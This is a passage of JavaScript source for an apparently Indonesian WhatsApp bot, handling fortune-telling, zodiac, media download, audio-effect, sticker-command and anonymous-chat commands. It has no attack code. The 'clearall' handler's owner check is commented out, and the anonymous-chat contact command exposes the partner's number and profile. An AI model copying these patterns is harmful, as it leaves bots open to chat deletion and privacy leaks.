          case '12345twitterimage': case '12345twimage': case '12345twitterfoto': case '12345twfoto': case '12345teitterjpg': {
                if (!text) throw `*Masukan Link Twitter Image*\n_Contoh :_ ${prefix + command} https://twitter.com/caci_ann/status/1514256565661954050?t=07p_yly64BkdOMmw_UzX6A&s=19`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/twitterimage', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}menu`, buttonText: {displayText: '</Menu'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.result.link },
                    caption: `*〔 Twitter Image 〕*

*⭔ Name :* ${anu.result.user.name}
*⭔ Username :* ${anu.result.user.username}
*⭔ Title :* ${anu.result.title}
*⭔ Publish :* ${anu.result.publish}
*⭔ Link :* ${text}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
//Primbon Menu  ]\\ 
               case '12345nomerhoki': case '12345nomorhoki': {
                if (!Number(text)) throw `*Masukan Nomor !*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case '12345artimimpi': case '12345tafsirmimpi': {
                if (!text) throw `*Masukan Mimpimu !*\n_Contoh:_ ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case '12345ramalanjodoh': case '12345ramaljodoh': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005, Nissa, 29, 3, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345ramalanjodohbali': case '12345ramaljodohbali': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345suamiistri': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345ramalancinta': case '12345ramalcinta': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345artinama': {
                if (!text) throw `*Masukan nama !*\n_Contoh:_ ${prefix + command} Fazrin Mauza`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345kecocokannama': case '12345cocoknama': {
                if (!text) throw `*Masukam nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case '12345kecocokanpasangan': case '12345cocokpasangan': case '12345pasangan': {
                if (!text) throw `Example : ${prefix + command} Fazrin|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case '12345jadianpernikahan': case '12345jadiannikah': {
                if (!text) throw `*Masukan tanggal jadian nikah!*\n_Contoh:_  ${prefix + command} 6,12,2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case '12345sifatusaha': {
                if (!text)throw `*Masukan tanggal usaha berdiri!*\n_Contoh:_ ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case '12345rejeki': case '12345rezeki': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345pekerjaan': case '12345kerja': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345ramalannasib': case '12345ramalnasib': case '12345nasib': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case '12345potensipenyakit': case '12345penyakit': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345artitarot': case '12345tarot': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345fengshui': {
                if (!text) throw `*Masukan nama,gender,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,1,2005\n\n_Note : Gender : 1 untuk laki-laki & 2 untuk perempuan_`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case '12345haribaik': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345harisangar': case '12345taliwangke': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345harinaas': case '12345harisial': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case '12345nagahari': case '12345harinaga': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345arahrejeki': case '12345arahrezeki': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345peruntungan': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir,untuk tahun*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005,2022`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345weton': case '12345wetonjawa': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case '12345sifat': case '12345karakter': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case '12345keberuntungan': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case '12345memancing': {
                if (!text) throw `*Masukan tanggal,bulan,tahun !*\n_Contoh:_ ${prefix + command} 5, 5, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '12345masasubur': {
                if (!text) throw `*Masukan tanggal,bulan,tahun pertama menstruasi,siklus!*\n_Contoh:_ ${prefix + command} 5, 5, 2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break        
case '12345zodiak': case '12345zodiac': {
                if (!text) throw `*Masukan tahun bulan tanggal*\n_Contoh :_ ${prefix+ command} 2005 09 05`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                Pajrin.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break

            case '12345umma': case '12345ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `${prefix}ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '🎵Audio🎵'}, type: 1},
                        {buttonId: `${prefix}ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '🎥Video🎥'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
To download media, please click one of the buttons below or enter the ytmp3/ytmp4 command with the url above
`,
			footer:  `${global.fake}`,
			buttons,
			headerType: 4
		    }
		    Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        Pajrin.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case '12345ringtone': {
		if (!text) throw `_Contoh :_ ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		Pajrin.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		
/*case '12345alkitab':  if(!text) throw `Masukan Search Yang Anda Cari`
epep = await.fetchJson(`https://melcanz.com/alkitabsearch?q=${text}&apikey=melcantik`)
break*/

		   case '12345bass': case '12345blown': case '12345deep': case '12345earrape': case '12345fast': case '12345fat': case '12345nightcore': case '12345reverse': case '12345robot': case '12345slow': case '12345smooth': case '12345squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replay(mess.wait)
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                Pajrin.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
case '12345clearall':
            // if (!isOwner) return  reply(mess.only.owner)
             anu = await Pajrin.chats.all()
             Pajrin.setMaxListeners(25)
             for (let _ of anu) {
             Pajrin.deleteChat(_.jid)
}
             reply('Sukses delete all chat :)')
             break
            case '12345setcmd': {
                if (!m.quoted) throw `*Reply sticker/image dengan caption* ${prefix + command} ${prefix}command nya\n\n_Contoh:_ ${prefix + comnand} ${prefix}menu`
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `*Untuk Command Apa?*\n_Contoh:_ ${prefix}menu`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
            case '12345delcmd': {
            	if (!m.quoted) throw `Reply sticker/image yang menjadi key cmd,untuk di hapus dari database cmd`
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `No hashes`
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.sticker[hash]
                reply(`Done!`)
            }
            break
            case '12345listcmd': {
                let teks = `
*Hash List*
Info: *bold* hash is locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                Pajrin.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case '12345lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) throw 'Hash not found in database'
                global.db.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case '12345addmsg': {
                if (!m.quoted) throw 'Reply Pesan Untuk Disimpan Dalam Database'
                if (!text) throw `*Masukan Teks untuk kata kunci pesan!*\n_Contoh:_ ${prefix + command} wow`
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully added message in message list as '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list pesan dengan ${prefix}listmsg`)
            }
            break
            case '12345getmsg': {
                if (!text) throw `*Masukan key message!*\n Lihat list msg dengan ${prefix}listmsg`
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                Pajrin.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case '12345nuklir': {
              if (!text) throw `Example : ${prefix + command} msg name\n\nView message list with ${prefix}listmsg`
                let msgs = global.db.database
               if (!(text.toLowerCase() in msgs)) throw `'${text}' not registered in message list`
                Pajrin.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case '12345listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case '12345delmsg': case '12345deletemsg': {
            	if (!text) throw `*Masukan key message yang mau di hapus!*\n Lihat list msg dengan ${prefix}listmsg`
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
	    case '12345anonymous': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [{
                                urlButton: {
                                    displayText: 'Report Bug🐛',
                                    url: 'https://wa.me/916909137213?text=hello+bro+i+found+a+bug+in+your+bot'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👻Start Anonymous👻',
                                    id: 'start'
                                }
                            }]
                Pajrin.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await Pajrin.getName(m.sender)} Welcome To Anonymous Chat\n\nClick The Button Below To Find A Partner\`\`\``,  `${global.fake}`, m)
            }
			break
case '12345sendkontak': case '12345sendcontact': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: '🚶Start🚶' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `_You Are Not In Anonymous Session, Press The Button To Find A Partner_`)
                    throw false
                }
                let profile = await Pajrin.profilePictureUrl(room.b)
                let status = await Pajrin.fetchStatus(room.b)
                let msg = await Pajrin.sendImage(room.a, profile, `Name : ${await Pajrin.getName(room.b)}\nBio : ${status.status}\nUser : @${room.b.split("@")[0]}`, m, { mentions: [room.b] })
                Pajrin.sendContact(room.a, [room.b.split("@")[0]], msg)
            }
            break
            case '12345stop': case '12345keluar': case '12345leave': {
                if (m.isGroup) return reply('This Features Cannot Be Use in Group!')
